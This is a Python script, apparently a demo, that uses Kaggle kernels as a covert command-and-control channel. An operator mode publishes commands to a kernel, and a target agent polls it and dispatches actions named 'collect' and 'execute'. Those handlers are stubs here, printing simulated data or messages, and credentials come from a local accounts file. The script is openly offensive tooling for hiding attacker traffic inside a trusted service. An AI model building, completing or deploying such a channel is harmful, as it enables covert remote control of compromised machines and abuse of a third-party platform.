#!/usr/bin/env python3
"""Kaggle C2 Channel Demo - Polling mechanism.

This demonstrates how to use Kaggle kernels as a C2 channel:
1. Operator sends commands via update_c2_commands()
2. Target polls commands via get_c2_commands()
3. Target executes commands
4. Loop continues
"""

import sys
import time
import json
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from agents.kaggle.datasets import update_c2_commands, get_c2_commands


def operator_mode(username: str, api_key: str, kernel_slug: str):
    """Operator mode: Send commands to target."""
    print("\n[OPERATOR] C2 Command Interface")
    print("="*60)
    
    while True:
        try:
            cmd = input("\nCommand (action target [args]): ").strip()
            if not cmd:
                continue
            
            if cmd.lower() in ['exit', 'quit']:
                break
            
            parts = cmd.split()
            action = parts[0] if parts else 'idle'
            target = parts[1] if len(parts) > 1 else 'system'
            
            commands = {
                'action': action,
                'target': target,
                'timestamp': time.time()
            }
            
            # Add extra args
            if len(parts) > 2:
                commands['args'] = ' '.join(parts[2:])
            
            result = update_c2_commands(username, api_key, kernel_slug, commands)
            
            if result['success']:
                print(f"[OPERATOR] ✓ Command sent: {commands}")
                print(f"[OPERATOR] Version: {result['version']}")
            else:
                print(f"[OPERATOR] ✗ Failed: {result['error']}")
        
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[OPERATOR] Error: {e}")


def target_mode(username: str, api_key: str, kernel_slug: str, interval: int = 30):
    """Target mode: Poll for commands and execute."""
    print("\n[TARGET] C2 Polling Agent")
    print("="*60)
    print(f"Polling interval: {interval}s")
    print(f"Kernel: {kernel_slug}")
    
    last_version = 0
    
    while True:
        try:
            result = get_c2_commands(username, api_key, kernel_slug)
            
            if result['success']:
                commands = result['commands']
                action = commands.get('action', 'idle')
                
                print(f"\n[TARGET] Command received: {commands}")
                
                # Execute command
                if action == 'idle':
                    print("[TARGET] No action")
                
                elif action == 'ping':
                    print("[TARGET] Pong!")
                
                elif action == 'collect':
                    print("[TARGET] Collecting data...")
                    # Simulate data collection
                    data = {'cpu': 45, 'memory': 60, 'disk': 70}
                    print(f"[TARGET] Data: {data}")
                
                elif action == 'sleep':
                    interval = commands.get('interval', 60)
                    print(f"[TARGET] Sleeping for {interval}s...")
                
                elif action == 'execute':
                    target = commands.get('target', 'system')
                    print(f"[TARGET] Executing on {target}...")
                
                else:
                    print(f"[TARGET] Unknown action: {action}")
            
            else:
                print(f"[TARGET] Poll failed: {result.get('error')}")
            
            time.sleep(interval)
        
        except KeyboardInterrupt:
            print("\n[TARGET] Stopping...")
            break
        except Exception as e:
            print(f"[TARGET] Error: {e}")
            time.sleep(interval)


def main():
    # Load credentials
    accounts_path = os.path.join(os.path.dirname(__file__), '..', 'data', 'accounts.json')
    
    with open(accounts_path) as f:
        acc = json.load(f)[-1]
    
    username = acc['kaggle_username']
    api_key = acc['api_key_legacy']
    kernel_slug = f"{username}/c2-channel"
    
    print("Kaggle C2 Channel Demo")
    print("="*60)
    print(f"Account: {username}")
    print(f"Kernel: {kernel_slug}")
    
    print("\nMode:")
    print("  1. Operator (send commands)")
    print("  2. Target (poll and execute)")
    
    choice = input("Select mode [1/2]: ").strip()
    
    if choice == '1':
        operator_mode(username, api_key, kernel_slug)
    elif choice == '2':
        interval = input("Polling interval [30]: ").strip()
        interval = int(interval) if interval else 30
        target_mode(username, api_key, kernel_slug, interval)
    else:
        print("Invalid choice")


if __name__ == '__main__':
    main()
